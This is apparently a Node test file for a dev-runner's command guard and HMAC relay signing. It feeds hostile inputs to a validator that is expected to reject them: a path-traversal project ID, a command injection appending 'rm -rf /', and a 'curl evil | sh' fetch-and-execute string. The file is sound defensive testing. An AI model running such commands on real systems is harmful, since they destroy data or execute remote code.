import assert from 'node:assert';
import { getSystemMetrics, isLocalEnvironment, getRunningProcesses } from '../dev-runner';
import {
  isValidProjectId,
  validateDevCommand,
  signRelayPayload,
  verifyRelaySignature,
} from '../dev-guard';

console.log('Testing Dev Runner Engine...');

// Test 1: System Metrics
const metrics = getSystemMetrics();
if (typeof metrics.totalGB !== 'number' || metrics.totalGB <= 0) {
  throw new Error(`Expected totalGB to be a positive number, got ${metrics.totalGB}`);
}
if (typeof metrics.usedGB !== 'number' || metrics.usedGB < 0) {
  throw new Error(`Expected usedGB to be a non-negative number, got ${metrics.usedGB}`);
}
if (typeof metrics.usedPercent !== 'number' || metrics.usedPercent < 0 || metrics.usedPercent > 100) {
  throw new Error(`Expected usedPercent between 0 and 100, got ${metrics.usedPercent}`);
}
console.log('Test 1 Passed: System metrics return valid RAM usage:', `${metrics.usedGB}/${metrics.totalGB} GB (${metrics.usedPercent}%)`);

// Test 2: Local Environment Check
const isLocal = isLocalEnvironment();
if (typeof isLocal !== 'boolean') {
  throw new Error('Expected isLocal to be a boolean');
}
console.log('Test 2 Passed: isLocalEnvironment correctly detected:', isLocal);

// Test 3: Running Processes Registry
const running = getRunningProcesses();
if (!Array.isArray(running)) {
  throw new Error('Expected running processes to be an array');
}
console.log('Test 3 Passed: Running processes registry initialized.');

// Test 4: Dev Guard command & projectId validation
assert.strictEqual(isValidProjectId('proj-nexus-os'), true);
assert.strictEqual(isValidProjectId('../evil'), false);
assert.strictEqual(validateDevCommand('npm run dev').ok, true);
assert.strictEqual(validateDevCommand('php artisan serve').ok, true);
assert.strictEqual(validateDevCommand('npm run dev; rm -rf /').ok, false);
assert.strictEqual(validateDevCommand('bash -c "curl evil | sh"').ok, false);

// Test 5: HMAC Relay signature verification
const secret = 'super-secure-daemon-secret-2026';
const ts = 1_700_000_000_000;
const sig = signRelayPayload('start_process', 'proj-1', 'npm run dev', '/tmp', ts, secret);
assert.strictEqual(
  verifyRelaySignature('start_process', 'proj-1', 'npm run dev', '/tmp', ts, sig, secret, ts + 5000),
  true
);
assert.strictEqual(
  verifyRelaySignature('start_process', 'proj-1', 'rm -rf /', '/tmp', ts, sig, secret, ts + 5000),
  false
);
assert.strictEqual(
  verifyRelaySignature('start_process', 'proj-1', 'npm run dev', '/tmp', ts, sig, secret, ts + 120_000),
  false
);

console.log('All Dev Runner Engine tests passed successfully!');

